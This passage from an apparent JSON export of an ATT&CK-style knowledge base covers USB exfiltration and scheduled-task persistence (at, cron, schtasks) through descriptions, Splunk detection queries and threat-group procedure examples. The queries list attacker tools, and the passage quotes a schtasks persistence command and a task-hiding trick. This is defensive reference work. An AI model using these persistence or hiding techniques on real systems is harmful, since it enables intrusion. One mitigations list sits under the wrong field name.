      "Velvet Anthas enumerated existing network connections on victim devices.[104]",
      "Volgmercan gather information about TCP connection state.[105]",
      "Volt Typhoonhas usednetstat -anoon compromised hosts to enumerate network connections.[106][107]",
      "Waterbearcan use API hooks onGetExtendedTcpTableto retrieve a table containing a list of TCP endpoints available to the application.[108]",
      "Zebrocyusesnetstat -aonto gather network connection information.[109]"
    ]
  },
  "T1052": {
    "Name": "Exfiltration Over Physical Medium",
    "Description": "Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
    "Detects": [
      "Monitor for execution of file transfer commands (robocopy, xcopy, cp, rsync) targeting removable media, use of disk utilities (diskpart, mount, mkfs) to format or prepare devices, or PowerShell or bash scripts automating file transfers to USB devices.Analytic 1 - Detecting File Transfers to Removable Media via Command Execution(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (command IN (\"robocopy\", \"xcopy\", \"cp\", \"rsync\", \"mount\", \"diskutil\"))| eval risk_score=case(    command IN (\"robocopy\", \"cp\", \"rsync\"), 9,    command IN (\"mount\", \"diskutil\"), 8)| where risk_score >= 8| stats count by _time, host, user, command, risk_score",
      "Detection of newly mounted USB or external drives, unusual storage devices connected to a system (e.g., large capacity, high-speed), or frequent device mount/unmount activity indicative of exfiltration attempts.Analytic 1 - Detecting New External Drive Mounting Events(EventCode=6 OR EventCode=4663 OR source=\"/var/log/syslog\" \"usb-storage added\" OR source=\"com.apple.DiskArbitration\")| where (device_type IN (\"USB\", \"Removable Storage\"))| stats count by _time, host, user, device_name, device_type| eval risk_score=case(    device_type=\"USB\", 9,    device_type=\"Removable Storage\", 8)| where risk_score >= 8| table host, user, device_name, device_type, risk_score",
      "Monitor file access on removable media that may attempt to exfiltrate data via a physical medium, such as a removable drive.Analytic 1 - Detecting File Access to Removable Media(EventCode=11 OR EventCode=4663 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_path IN (\"/media/usb/\", \"/mnt/usb/\", \"D:\\USB\\\", \"E:\\USB\\\"))| eval risk_score=case(    file_path LIKE \"%/media/usb/%\", 9,    file_path LIKE \"%D:\\USB\\%\", 8)| where risk_score >= 8| stats count by _time, host, user, file_path, risk_score",
      "Monitor for processes triggered when external storage is connected, autorun scripts executed from USB drives, or file explorer or PowerShell processes interacting with external storage.Analytic 1 - Detecting Processes Executed from USB Devices(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (process_name IN (\"explorer.exe\", \"powershell.exe\", \"cmd.exe\", \"bash\", \"sh\") AND process_path LIKE \"/media/usb/%\")| eval risk_score=case(    process_path LIKE \"/media/usb/%\", 9,    process_path LIKE \"D:\\USB\\%\", 8)| where risk_score >= 8| stats count by _time, host, user, process_name, process_path, risk_score"
    ],
    "Procedure Examples": [
      "Data loss prevention can detect and block sensitive data being copied to physical mediums.",
      "Disable Autorun if it is unnecessary.[1]Disallow or restrict removable media at an organizational policy level if they are not required for business operations.[2]",
      "Limit the use of USB devices and removable media within a network."
    ]
  },
  "T1052.001": {
    "Name": "Exfiltration Over Physical Medium:Exfiltration over USB",
    "Description": "Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
    "Detects": [
      "Monitor for execution of file transfer commands targeting USB storage (robocopy, xcopy, cp, rsync), use of disk management utilities (diskpart, mount, mkfs, fdisk), or PowerShell or Bash scripts automating USB file transfers.Analytic 1 - Detecting File Transfers to USB via Command Execution(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (command IN (\"robocopy\", \"xcopy\", \"cp\", \"rsync\", \"mount\", \"diskutil\", \"diskpart\"))| eval risk_score=case(    command IN (\"robocopy\", \"cp\", \"rsync\"), 9,    command IN (\"mount\", \"diskutil\", \"diskpart\"), 8)| where risk_score >= 8| stats count by _time, host, user, command, risk_score",
      "Monitor for newly assigned drive letters or mount points to a data storage device that may attempt to exfiltrate data over a USB connected physical device.Analytic 1 - Detecting New USB Drive Mounting Events(EventCode=6 OR EventCode=4663 OR source=\"/var/log/syslog\" \"usb-storage added\" OR source=\"com.apple.DiskArbitration\")| where (device_type IN (\"USB\", \"Removable Storage\"))| stats count by _time, host, user, device_name, device_type| eval risk_score=case(    device_type=\"USB\", 9,    device_type=\"Removable Storage\", 8)| where risk_score >= 8| table host, user, device_name, device_type, risk_score",
      "Monitor file access on removable media that may attempt to exfiltrate data over a USB connected physical device.Analytic 1 - Detecting File Transfers to USB Storage(EventCode=11 OR EventCode=4663 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_path IN (\"/media/usb/\", \"/mnt/usb/\", \"D:\\USB\\\", \"E:\\USB\\\"))| eval risk_score=case(    file_path LIKE \"%/media/usb/%\", 9,    file_path LIKE \"%D:\\USB\\%\", 8)| where risk_score >= 8| stats count by _time, host, user, file_path, risk_score",
      "Monitor for newly executed processes when removable media is mountedAnalytic 1 - Detecting Processes Executed from USB Devices(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (process_name IN (\"explorer.exe\", \"powershell.exe\", \"cmd.exe\", \"bash\", \"sh\") AND process_path LIKE \"/media/usb/%\")| eval risk_score=case(    process_path LIKE \"/media/usb/%\", 9,    process_path LIKE \"D:\\USB\\%\", 8)| where risk_score >= 8| stats count by _time, host, user, process_name, process_path, risk_score"
    ],
    "Procedure Examples": [
      "Agent.btzcreates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.[1]",
      "Machetehas a feature to copy files from every drive onto a removable drive in a hidden folder.[2][3]",
      "Mustang Pandahas used a customizedPlugXvariant which could exfiltrate documents from air-gapped networks.[4]",
      "Remseccontains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.[5]",
      "SPACESHIPcopies staged data to removable drives when they are inserted into the system.[6]",
      "Tropic Trooperhas exfiltrated data using USB storage devices.[7]",
      "USBStealerexfiltrates collected files via removable media from air-gapped victims.[8]"
    ]
  },
  "T1053": {
    "Name": "Scheduled Task/Job",
    "Description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.[1]Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar toSystem Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.[2]",
    "Detects": [
      "Monitor executed commands and arguments that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.Analytic 1 - Look for task scheduling commands being executed with unusual parameters.index=security (sourcetype=\"WinEventLog:Security\" OR sourcetype=\"linux_secure\" OR sourcetype=\"macos_secure\" OR sourcetype=\"container_logs\")| eval CommandLine = coalesce(CommandLine, process)| where (sourcetype=\"WinEventLog:Security\" AND EventCode IN (4697, 4702, 4698)) OR       (sourcetype=\"linux_secure\" AND CommandLine LIKE \"%cron%\" OR CommandLine LIKE \"%at%\") OR       (sourcetype=\"macos_secure\" AND CommandLine LIKE \"%launchctl%\" OR CommandLine LIKE \"%cron%\") OR       (sourcetype=\"container_logs\" AND (CommandLine LIKE \"%cron%\" OR CommandLine LIKE \"%at%\"))| where (sourcetype=\"WinEventLog:Security\" AND (CommandLine LIKE \"%/create%\" OR CommandLine LIKE \"%/delete%\" OR CommandLine LIKE \"%/change%\")) OR       (sourcetype=\"linux_secure\" AND (CommandLine LIKE \"%-f%\" OR CommandLine LIKE \"%-m%\" OR CommandLine LIKE \"%--env%\")) OR       (sourcetype=\"macos_secure\" AND (CommandLine LIKE \"%/Library/LaunchDaemons%\" OR CommandLine LIKE \"%/Library/LaunchAgents%\" OR CommandLine LIKE \"%/System/Library/LaunchDaemons%\" OR CommandLine LIKE \"%/System/Library/LaunchAgents%\")) OR       (sourcetype=\"container_logs\" AND (CommandLine LIKE \"%-f%\" OR CommandLine LIKE \"%--schedule%\" OR CommandLine LIKE \"%--env%\"))",
      "Monitor for newly constructed containers that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.Analytic 1 - Look for new container creation events with unusual parameters.index=container_logs sourcetype=\"docker_events\" OR sourcetype=\"kubernetes_events\"| eval event_action=coalesce(action, status)| where (event_action=\"create\" OR event_action=\"start\")| search event_type=\"container\"| search (parameters=\"--privileged\" OR parameters=\"--cap-add=\" OR parameters=\"--volume=\" OR parameters=\"--network=host\" OR parameters=\"--device\")",
      "Monitor newly constructed files that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.Analytic 1 - Look for new task files with unusual parameters.index=security_logs OR index=system_logs(sourcetype=\"docker_events\" OR sourcetype=\"kubernetes_events\" OR sourcetype=\"wineventlog:security\" OR sourcetype=\"linux_secure\" OR sourcetype=\"syslog\" OR sourcetype=\"file_monitoring\")| eval platform=case(    sourcetype==\"docker_events\" OR sourcetype==\"kubernetes_events\", \"Containers\",    sourcetype==\"wineventlog:security\", \"Windows\",    sourcetype==\"linux_secure\" OR sourcetype==\"syslog\", \"Linux\",    sourcetype==\"mac_os_events\", \"macOS\")| search (    (platform=\"Containers\" AND (event_type=\"file_create\" AND (file_path=\"/etc/cron.d/\" OR file_path=\"/etc/systemd/system/\"))) OR    (platform=\"Windows\" AND EventCode=4663 AND (ObjectName=\"C:\\Windows\\System32\\Tasks\\\" OR ObjectName=\"C:\\Windows\\Tasks\\\")) OR    (platform=\"Linux\" AND (file_path=\"/etc/cron.d/\" OR file_path=\"/etc/systemd/system/\")) OR    (platform=\"macOS\" AND (file_path=\"/Library/LaunchDaemons/\" OR file_path=\"/Library/LaunchAgents/\")))",
      "Monitor for changes made to files that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.Analytic 1 - Look for task file modifications with unusual parameters.index=security_logs OR index=system_logs(sourcetype=\"docker_events\" OR sourcetype=\"kubernetes_events\" OR sourcetype=\"wineventlog:security\" OR sourcetype=\"linux_secure\" OR sourcetype=\"syslog\" OR sourcetype=\"file_monitoring\")| eval platform=case(    sourcetype==\"docker_events\" OR sourcetype==\"kubernetes_events\", \"Containers\",    sourcetype==\"wineventlog:security\", \"Windows\",    sourcetype==\"linux_secure\" OR sourcetype==\"syslog\", \"Linux\",    sourcetype==\"mac_os_events\", \"macOS\")| search (    (platform=\"Containers\" AND (event_type=\"file_modify\" AND (file_path=\"/etc/cron.d/\" OR file_path=\"/etc/systemd/system/\" OR file_path=\"/etc/crontab\"))) OR    (platform=\"Windows\" AND EventCode=4663 AND (ObjectName=\"C:\\Windows\\System32\\Tasks\\\" OR ObjectName=\"C:\\Windows\\Tasks\\\")) OR    (platform=\"Linux\" AND (file_path=\"/etc/cron.d/\" OR file_path=\"/etc/systemd/system/\" OR file_path=\"/etc/crontab\")) OR    (platform=\"macOS\" AND (file_path=\"/Library/LaunchDaemons/\" OR file_path=\"/Library/LaunchAgents/\")))",
      "Monitor for newly executed processes that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.Note: Below is the relevant Events and SourcesWindows:Sysmon Event ID 1: Process creation, particularly for schtasks.exe, at.exe, Taskeng.exe, crontab, etc.Windows Event Log EventCode 4688: Process creation that might involve task scheduling.Windows Task Scheduler Logs: Task creation, modification, or deletion.Linux/macOS:Auditd logs: Monitoring for cron job creation or modifications.Syslog: Logs related to cron jobs or scheduled tasks.File integrity monitoring (FIM): For changes to /etc/cron, /var/spool/cron/, or user-specific cron jobs.Containers:- Container logs: Detection of scheduled tasks or cron jobs within container environments.Analytic 1 - Look for task execution with unusual parameters.(sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" OR sourcetype=\"WinEventLog:Security\" OR sourcetype=\"linux_auditd\" OR sourcetype=\"syslog\") | where Image IN (\"schtasks.exe\", \"at.exe\", \"Taskeng.exe\", \"cron\", \"crontab\", \"systemd-timers\")",
      "Monitor newly constructed scheduled jobs that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.On Windows systems, security event ID 4698 (A scheduled task was created) provides information on newly created scheduled tasks. It includes the TaskContent field, which contains an XML blob that captures key information on the scheduled task including the command to be executed.Analytic 1 - Scheduled Task Executionsource=\"*WinEventLog:Security\" EventCode=\"4698\" | where NOT (TaskName IN (\"\\Microsoft\\Windows\\UpdateOrchestrator\\Reboot\", \"\\Microsoft\\Windows\\Defrag\\ScheduledDefrag\"))| search TaskContent=\"powershell.exe\" OR TaskContent=\"cmd.exe\""
    ],
    "Procedure Examples": [
      "DEADEYEhas used the scheduled tasks\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor,\\Microsoft\\Windows\\Ras\\ManagerMobility,\\Microsoft\\Windows\\WDI\\SrvSetupResults, and\\Microsoft\\Windows\\WDI\\USOSharedto establish persistence.[3]",
      "Earth Luscaused the commandschtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR \"[file path]\" /ru systemfor persistence.[4]",
      "Lokibot's second stage DLL has set a timer using \"timeSetEvent\" to schedule its next execution.[5]",
      "Remsecschedules the execution one of its modules by creating a new scheduler task.[6]",
      "StrifeWaterhas create a scheduled task namedMozilla\\Firefox Default Browser Agent 409046Z0FF4A39CBfor persistence.[7]"
    ]
  },
  "T1053.002": {
    "Name": "Scheduled Task/Job:At",
    "Description": "Adversaries may abuse theatutility to perform task scheduling for initial or recurring execution of malicious code. Theatutility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor ofScheduled Task'sschtasksin Windows environments, usingatrequires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running theatcommand, adversaries may also schedule a task withatby directly leveraging theWindows Management InstrumentationWin32_ScheduledJobWMI class.[1]On Linux and macOS,atmay be invoked by the superuser as well as any users added to theat.allowfile. If theat.allowfile does not exist, theat.denyfile is checked. Every username not listed inat.denyis allowed to invokeat. If theat.denyexists and is empty, global use ofatis permitted. If neither file exists (which is often the baseline) only the superuser is allowed to useat.[2]Adversaries may useatto execute programs at system startup or on a scheduled basis forPersistence.atcan also be abused to conduct remoteExecutionas part ofLateral Movementand/or to run a process under the context of a specified account (such as SYSTEM).In Linux environments, adversaries may also abuseatto break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly,atmay also be used forPrivilege Escalationif the binary is allowed to run as superuser viasudo.[3]",
    "Detects": [
      "Monitor executed commands and arguments for actions that could be taken to create/modify tasks. Tasks may also be created through Windows system management tools such asWindows Management InstrumentationandPowerShell, so additional logging may need to be configured to gather the appropriate data.Analytic 1 - Linux Command Executionindex=linux_logs sourcetype=syslog \"at\" | rex \"user=(?\\w+)\"Analytic 2 - Windows Command Executionindex=windows_logs sourcetype=WinEventLog:System EventCode=4698 TaskName=\"at*\"| where NOT (user=\"SYSTEM\" AND TaskName=\"\\Microsoft\\Windows\\Defrag\\ScheduledDefrag\")",
      "On Windows, monitor Windows Task Scheduler stores in%systemroot%\\System32\\Tasksfor change entries related to scheduled tasks, especially those that do not correlate with known software, patch cycles, etc. On Linux and macOS, allatjobs are stored in/var/spool/cron/atjobs/.[15]Analytic 1 - Look for task file modifications with unusual parameters. (Linux)index=linux_logs sourcetype=syslog \"at\" \"/var/spool/cron/atjobs/\"| rex \"user=(?\\w+)\"Analytic 2 - Look for task file modifications with unusual parameters. (Windows)index=windows_logs sourcetype=WinEventLog:System EventCode=4663 Object_Type=\"File\"| rex field=_raw \"Object_Name=(?[^\\r\\n]+)\"| search file_path=\"at\"| where NOT (user=\"SYSTEM\" AND file_path=\"C:\\Windows\\Tasks\\allowed_task.job\")",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. When AT.exe is used to remotely schedule tasks, Windows uses named pipes over SMB to communicate with the API on the remote machine. After authentication over SMB, the Named PipeATSVCis opened, over which the JobAdd function is called. On the remote host, the job files are created by the Task Scheduler and follow the conventionC:\\Windows\\System32\\AT.This pipe activity could be discovered with a network decoder, such as that in wireshark, that can inspect SMB traffic to identify the use of pipes. It could also be detected by looking for raw packet capture streams or from a custom sensor on the host that hooks the appropriate API functions. If no network or API level of visibility is possible, this traffic may inferred by looking at SMB connections over 445/tcp followed by the creation of files matching the patternC:\\Windows\\System32\\AT\\<job_id>.To detect AT via network traffic, a sensor is needed that has the ability to extract and decode PCAP information. Specifically, it needs to properly decode SMB and the functions that are implemented over it via NamedPipes. If a sensor meets these criteria, then the PCAP data needs to search for instances of the commandJobAddover the pipeATSVC, which is all implemented over Windows SMB 445/tcp.Analytic 1 - Remotely Scheduled Tasks via ATindex=network dest_port=445 protocol=\"smb\" pipe=\"ATSVC\" command=\"JobAdd\"",
      "Monitor for newly constructed processes with command-lines that create/modify or are executed from tasks. For example, on Windows tasks may spawn fromsvchost.exeor the Windows Task Schedulertaskeng.exefor older OS versions.[16]Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Instances of the process at.exe running imply the querying or creation of tasks. Although the command_line is not essential for the analytic to run, it is critical when identifying the command that was scheduled.Analytic 1 - Scheduled Task(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image=\"*at.exe\"",
      "Monitor for newly constructed scheduled jobs. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. On Windows, enable the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service where several events will then be logged on scheduled task activity, including:[17]Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registeredEvent ID 4698 on Windows 10, Server 2016 - Scheduled task createdEvent ID 4700 on Windows 10, Server 2016 - Scheduled task enabledEvent ID 4701 on Windows 10, Server 2016 - Scheduled task disabledTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[18]"
    ],
    "Procedure Examples": [
      "APT18actors used the nativeatWindows task scheduler tool to use scheduled tasks for execution on a victim network.[4]",
      "atcan be used to schedule a task on a system to be executed at a specific date or time.[5][2]",
      "BRONZE BUTLERhas usedatto register a scheduled task to execute malware during lateral movement.[6]",
      "CrackMapExeccan set a scheduled task on the target system to execute commands remotely usingat.[7]",
      "MURKYTOPhas the capability to schedule remote AT jobs.[8]",
      "Threat Group-3390actors useatto schedule tasks to run self-extracting RAR archives, which installHTTPBrowserorPlugXon other victims on a network.[9]"
    ]
  },
  "T1053.003": {
    "Name": "Scheduled Task/Job:Cron",
    "Description": "Adversaries may abuse thecronutility to perform task scheduling for initial or recurring execution of malicious code.[1]Thecronutility is a time-based job scheduler for Unix-like operating systems.  Thecrontabfile contains the schedule of cron entries to be run and the specified times for execution. Anycrontabfiles are stored in operating system-specific file paths.An adversary may usecronin Linux or Unix environments to execute programs at system startup or on a scheduled basis forPersistence. In ESXi environments, cron jobs must be created directly via the crontab file (e.g.,/var/spool/cron/crontabs/root).[2]",
    "Detects": [
      "Monitor execution of commands related to cron that are out of alignment with known software or administrative tasks. Monitor executed atq command and ensure IP addresses stored in theSSH_CONNECTIONandSSH_CLIENTvariables, machines that created the jobs, are trusted hosts. All at jobs are stored in/var/spool/cron/atjobs/.Analytic 1 - Suspicious Cron executionindex=linux_logs sourcetype=cron_logs | search \"cron\" AND (command=\"crontab -e\" OR command=\"crontab -l\" OR command=\"* * *\" OR command=\"/cron.d/\")",
      "Monitor modifications to crontab files or system-wide cron directories. Monitor for changes made to files for unexpected modifications to access permissions and attributes.Analytic 1 -  Modified Files in Linux Cron Directoriesindex=linux sourcetype:cron_logs:scheduled_tasks\" | search \"modification\" AND (file_path=\"/etc/crontab\" OR file_path=\"/var/spool/cron/crontabs/\" OR file_path=\"/etc/cron.d/\")",
      "Create a baseline of cron jobs and the processes that they spawn in your environment. Monitor for newly spawned outlier processes that are executed through cron jobs that have not been seen before when compared against the baseline data.Analytic 1 - Unusual Cron Job Creationindex=os_logs sourcetype=process_creation (process_name=\"cron\" OR process_name=\"/usr/sbin/cron\")",
      "Monitor for newly constructed scheduled jobs. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.Analytic 1 - Look for new cron job creation events with unusual parameters.index=os_logs sourcetype=syslog (command=\"crontab -e\" OR command=\"crontab -l\")| stats count by user host| where user != \"root\" OR count > 1"
    ],
    "Procedure Examples": [
      "Anchorcan install itself as a cron job.[3]",
      "APT38has used cron to create pre-scheduled and periodic background jobs on a Linux system.[4]",
      "APT5has made modifications to the crontab file including in/var/cron/tabs/.[5]",
      "Exaramel for Linuxuses crontab for persistence if it does not have root privileges.[6][7]",
      "TheGoldMaxLinux variant has used a crontab entry with a@rebootline to gain persistence.[8]",
      "Gomirwill configure a crontab for process execution to start the backdoor on reboot if it is not initially running under group 0 privileges.[9]",
      "Janicabused a cron job for persistence on Mac devices.[10]",
      "Kinsinghas used crontab to download and run shell scripts every minute to ensure persistence.[11]",
      "NETWIREcan use crontabs to establish persistence.[12]",
      "NKAbuseuses a Cron job to establish persistence when infecting Linux hosts.[13]",
      "DuringOperation MidnightEclipse, threat actors configured cron jobs to retrieve payloads from actor-controlled infrastructure.[14][15]",
      "Penquincan use Cron to create periodic and pre-scheduled background jobs.[16]",
      "Rockeinstalled a cron job that downloaded and executed files from the C2.[17][18][19]",
      "Skidmaphas installed itself via crontab.[20]",
      "SpeakUpuses cron tasks to ensure persistence.[21]",
      "Xbashcan create a cronjob for persistence if it determines it is on a Linux system.[22]"
    ]
  },
  "T1053.005": {
    "Name": "Scheduled Task/Job:Scheduled Task",
    "Description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. Theschtasksutility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.[1]In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library andWindows Management Instrumentation(WMI) to create a scheduled task. Adversaries may also utilize the Powershell CmdletInvoke-CimMethod, which leverages WMI classPS_ScheduledTaskto create a scheduled task via an XML path.[2]An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar toSystem Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.[3]Adversaries may also create \"hidden\" scheduled tasks (i.e.Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task fromschtasks /queryand the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).[4][5]Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g.,Indexvalue) within associated registry keys.[6]",
    "Detects": [
      "Monitor for commands being executed via schtasks or other utilities related to task scheduling.Analytic 1 - Look for schtasks.exe execution with arguments indicative of task creation/modification.sourcetype=WinEventLog:Powershell (EventCode=4104 OR command=\"schtasks.exe\")| stats count by user host process_name command_line| where Image=\"schtasks.exe\" OR command_line=\"schtasks\"",
      "Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. In order to gain persistence, privilege escalation, or remote execution, an adversary may use the Windows Task Scheduler to schedule a command to be run at a specified time, date, and even host. Task Scheduler stores tasks as files in two locations - C:\\Windows\\Tasks (legacy) or C:\\Windows\\System32\\Tasks. Accordingly, this analytic looks for the creation of task files in these two locations.Analytic 1 - Look for new task files in %systemroot%\\System32\\Tasks.((source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"11\") OR (sourcetype=WinEventLog:Security EventCode=4663)) (TargetFilename= \"C:\\Windows\\System32\\Tasks\\\" OR TargetFilename  \"C:\\Windows\\Tasks\\*\")  AND Image!= \"C:\\WINDOWS\\system32\\svchost.exe\"",
      "Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.Analytic 1 - Look for task file modifications with unusual parameters.sourcetype=WinEventLog:Security (EventCode=4663 OR file_path=\"C:\\Windows\\System32\\Tasks\\*\")| stats count by user host file_path action| where action=\"Write\" OR action=\"Create\"",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Look for RPC traffic after being mapped, which implies a destination port of at least 49152. If network inspection is available via packet captures or a NIDS, then traffic through theITaskSchedulerServiceinterface can be detected. Microsoft has a list of the possible methods that are implemented for theITaskSchedulerServiceinterface, which may be useful in differentiating read and query operations from creations and modifications.When scheduled tasks are created remotely, Windows uses RPC (135/tcp) to communicate with the Task Scheduler on the remote machine. Once an RPC connection is established, the client communicates with the Scheduled Tasks endpoint, which runs within the service group netsvcs. With packet capture and the right packet decoders or byte-stream based signatures, remote invocations of these functions can be identified.Certain strings can be identifiers of the schtasks, by looking up the interface UUID of ITaskSchedulerService in different formatsUUID86d35949-83c9-4044-b424-db363231fd0c(decoded)Hex49 59 d3 86 c9 83 44 40 b4 24 db 36 32 31 fd 0c(raw)ASCIIIYD@$621(printable bytes only)This identifier is present three times during the RPC request phase. Any sensor that has access to the byte code as raw, decoded, or ASCII could implement an analytic.Analytic 1 - Look for RPC traffic with ITaskSchedulerService interface usage.sourcetype=Netflow OR sourcetype=PacketCapture OR sourcetype=WinEventLog:Security EventCode=5156 | search (dest_port=135 OR dest_port=5985 OR dest_port=5986) AND (protocol=\"tcp\" OR protocol=\"udp\")  AND (Image=\"taskeng.exe\" OR Image=\"schtasks.exe\")| stats count by src_ip dest_ip dest_port| where count > threshold",
      "Monitor for newly constructed processes and/or command-lines that execute from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows.[232]If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Look for instances ofschtasks.exerunning as processes. Thecommand_linefield is necessary to disambiguate between types of schtasks commands. These include the flags/create,/run,/query,/delete,/change, and/end.Detection of the creation or modification of Scheduled Tasks with a suspicious script, extension or user writable path. Attackers may create or modify Scheduled Tasks for the persistent execution of malicious code. This detection focuses at the same time on EventIDs 4688 and 1 with process creation (SCHTASKS) and EventID 4698, 4702 for Scheduled Task creation/modification event log.Analytic 1 - New processes whose parent processes are svchost.exe or taskeng.exe(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") AND (ParentImage=\"svchost.exe\" OR ParentImage=\"taskeng.exe\")Analytic 2 - Scheduled Task Creation or Modification Containing Suspicious Scripts, Extensions or User Writable Paths(        (source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\")         OR         (source=\"WinEventLog:Security\" EventCode=\"4688\")         CommandLine=\"SCHTASKS\"         (CommandLine=\"/CREATE\" OR CommandLine=\"/CHANGE\")    )     (        (            CommandLine=\".cmd\" OR             CommandLine=\".ps1\" OR             CommandLine=\".vbs\" OR             CommandLine=\".py\" OR             CommandLine=\".js\" OR             CommandLine=\".exe\" OR             CommandLine=\".bat\"        ) OR         (            CommandLine=\"javascript\" OR             CommandLine=\"powershell\" OR             CommandLine=\"wmic\" OR             CommandLine=\"rundll32\" OR             CommandLine=\"cmd\" OR             CommandLine=\"cscript\" OR             CommandLine=\"wscript\" OR             CommandLine=\"regsvr32\" OR             CommandLine=\"mshta\" OR             CommandLine=\"bitsadmin\" OR             CommandLine=\"certutil\" OR             CommandLine=\"msiexec\" OR             CommandLine=\"javaw\"        ) OR         (            CommandLine=\"%APPDATA%\" OR             CommandLine=\"\\AppData\\Roaming\" OR             CommandLine=\"%PUBLIC%\" OR             CommandLine=\"C:\\Users\\Public\" OR             CommandLine=\"%ProgramData%\" OR             CommandLine=\"C:\\ProgramData\" OR             CommandLine=\"%TEMP%\" OR             CommandLine=\"\\AppData\\Local\\Temp\" OR             CommandLine=\"\\Windows\\PLA\\System\" OR             CommandLine=\"\\tasks\" OR             CommandLine=\"\\Registration\\CRMLog\" OR             CommandLine=\"\\FxsTmp\" OR             CommandLine=\"\\spool\\drivers\\color\" OR             CommandLine=\"\\tracing\"        )    )",
      "Monitor for newly constructed scheduled jobs by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service.[233]Several events will then be logged on scheduled task activity, including Event ID 106 on Windows 7 and Server 2008 R2 for scheduled task registration. For Windows 10 and Server 2016, the relevant events are also logged in the Windows Security event channel after enabling the auditing of other object access events. These include:Event ID 4698: A scheduled task was created.Event ID 4699: A scheduled task was deleted.Event ID 4700: A scheduled task was enabled.Event ID 4701: A scheduled task was disabled.Event ID 4702: A scheduled task was updated.Note: Detection of the creation or modification of Scheduled Tasks with a suspicious script, extension or user writable path. Attackers may create or modify Scheduled Tasks for the persistent execution of malicious code. This detection focuses at the same time on EventIDs 4688 and 1 with process creation (SCHTASKS) and EventID 4698, 4702 for Scheduled Task creation/modification event log.Analytic 1 - New schedule tasks whose content includes suspicious scripts, extensions or user writable path(source=\"*WinEventLog:Security\" EventCode IN (4698, 4702, 4699, 4700, 4701)) | where(JobContent LIKE '%.cmd%' OR JobContent LIKE '%.ps1%' OR   JobContent LIKE '%.vbs%' OR JobContent LIKE '%.py%' OR   JobContent LIKE '%.js%' OR JobContent LIKE '%.exe%' OR   JobContent LIKE '%.bat%' OR JobContent LIKE '%javascript%' OR   JobContent 